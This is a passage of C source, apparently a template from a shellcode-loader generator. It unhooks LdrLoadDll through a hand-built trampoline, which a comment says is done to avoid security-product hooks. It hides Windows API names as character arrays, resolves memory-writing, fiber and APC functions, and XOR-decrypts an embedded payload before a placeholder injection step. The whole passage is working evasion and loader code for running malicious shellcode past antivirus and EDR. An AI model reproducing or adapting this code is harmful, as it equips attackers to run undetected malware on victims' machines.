    pGetProcAddress MyGetProcAddress1 = (pGetProcAddress)GetProcAddress((HMODULE)MyGetModuleHandleA1(kernel32), (LPCSTR)get_proc_address);
    char virtual_alloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
    typedef LPVOID(WINAPI* pVirtualAlloc)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flAllocationType,
            DWORD flProtect
    );

    pVirtualAlloc MyVirtualAlloc1 = (pVirtualAlloc)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)virtual_alloc);
    char virtual_protect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
    typedef BOOL(WINAPI* pVirtualProtect)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flNewProtect,
            PDWORD lpflOldProtect
    );
    pVirtualProtect MyVirtualProtect1 = (pVirtualProtect)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32),(LPCSTR)virtual_protect);

    FARPROC  origLdrLoadDll = MyGetProcAddress1(GetModuleHandleA(ntdll), (LPCSTR)ldr_load_dll);
#ifdef _WIN64
    //Setting up the structure of the trampoline for the instructions
    unsigned char jumpPrelude[] = { 0x49, 0xBB };
    unsigned char jumpAddress[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
    unsigned char jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };
    LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x5);
    *(void**)(jumpAddress) = jmpAddr;
    LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    // mov qword ptr[rsp + 10h]  原始的LdrLoadDll中汇编，使用我们自己的防止被hook
    // mov r11,address
    // jmp rll
    // ret
    CCopyMemory(trampoline, (PVOID)"\x48\x89\x5c\x24\x10", 5);
    //Setting up the JMP address in the original LdrLoadDll
    CCopyMemory((PBYTE)trampoline + 5, jumpPrelude, 2);
    CCopyMemory((PBYTE)trampoline + 5 + 2, jumpAddress, sizeof(jumpAddress));
    CCopyMemory((PBYTE)trampoline + 5 + 2 + 8, jumpEpilogue, 4);
    DWORD oldProtect1 = 0;
    MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
    LdrLoadrDll = (pNewLdrLoadDll)trampoline;

    //Loading dll
    HANDLE User32module = NULL;
    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
    HANDLE kernel32module = NULL;
    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
    HANDLE ntdllmodule = NULL;
    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
    typedef HMODULE(WINAPI* pGetModuleHandleA)(
            LPCSTR lpModuleName
    );
    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);

    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);

    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);


    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    typedef BOOL(WINAPI* pWriteProcessMemory)(
            HANDLE hProcess,
            LPVOID lpBaseAddress,
            LPCVOID lpBuffer,
            SIZE_T nSize,
            SIZE_T* lpNumberOfBytesWritten
    );

    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
            LPVOID lpParameter
    );

    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);

    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);

    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);

    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pCreateFiber)(
            SIZE_T dwStackSize,
            LPFIBER_START_ROUTINE lpStartAddress,
            LPVOID lpParameter
    );

    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);

    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef VOID(WINAPI* pSwitchToFiber)(
            LPVOID lpFiber
    );

    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
    typedef BOOL(WINAPI* pEnumCalendarInfo)(
            CALINFO_ENUMPROCA lpCalInfoEnumProc,
            LCID Locale,
            CALID Calendar,
            CALTYPE CalType
    );
    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);

    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
    typedef BOOL(WINAPI* pQueueUserAPC)(
            PAPCFUNC pfnAPC,
            HANDLE hThread,
            ULONG_PTR dwData
    );

    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
    typedef NTSTATUS(NTAPI* pNtTestAlert)(
            VOID
    );

    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
#else
    //  x86 架构下的代码
	LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x2);

	unsigned char jumpPrelude[] = { 0xB8 };
	unsigned char jumpAddress[] = { 0x65, 0x72, 0x45, 0x77 };
	unsigned char jumpEpilogue[] = { 0xFF, 0xE0, 0xC3 };
	*(void**)(jumpAddress) = jmpAddr;

	CCopyMemory(trampoline, (PVOID)"\x89\xFF", 2);
	CCopyMemory((PBYTE)trampoline + 2, jumpPrelude, sizeof jumpPrelude);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude, jumpAddress, sizeof jumpAddress);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude + sizeof jumpAddress, jumpEpilogue, sizeof jumpEpilogue);
	DWORD oldProtect1 = 0;
	MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
	LdrLoadrDll = (pNewLdrLoadDll)trampoline;

    //Loading dll
    HANDLE User32module = NULL;
    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
    HANDLE kernel32module = NULL;
    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
    HANDLE ntdllmodule = NULL;
    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
    typedef HMODULE(WINAPI* pGetModuleHandleA)(
            LPCSTR lpModuleName
    );
    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);

    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);

    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);

    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    typedef BOOL(WINAPI* pWriteProcessMemory)(
            HANDLE hProcess,
            LPVOID lpBaseAddress,
            LPCVOID lpBuffer,
            SIZE_T nSize,
            SIZE_T* lpNumberOfBytesWritten
    );

    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
            LPVOID lpParameter
    );

    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);

    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);

    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);

    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef LPVOID(WINAPI* pCreateFiber)(
            SIZE_T dwStackSize,
            LPFIBER_START_ROUTINE lpStartAddress,
            LPVOID lpParameter
    );

    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);

    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
    typedef VOID(WINAPI* pSwitchToFiber)(
            LPVOID lpFiber
    );

    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
    typedef BOOL(WINAPI* pEnumCalendarInfo)(
            CALINFO_ENUMPROCA lpCalInfoEnumProc,
            LCID Locale,
            CALID Calendar,
            CALTYPE CalType
    );
    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);

    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
    typedef BOOL(WINAPI* pQueueUserAPC)(
            PAPCFUNC pfnAPC,
            HANDLE hThread,
            ULONG_PTR dwData
    );

    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
    typedef NTSTATUS(NTAPI* pNtTestAlert)(
            VOID
    );

    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
#endif
    ;

	REPLACR_OBFUSCATION

	unsigned char key[] = "%s";
    unsigned int key_len = sizeof(key);
    My_Xor((char*)xpp, length, (char*)key, key_len);

	SIZE_T allocationSize = length;
	void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;

}
`
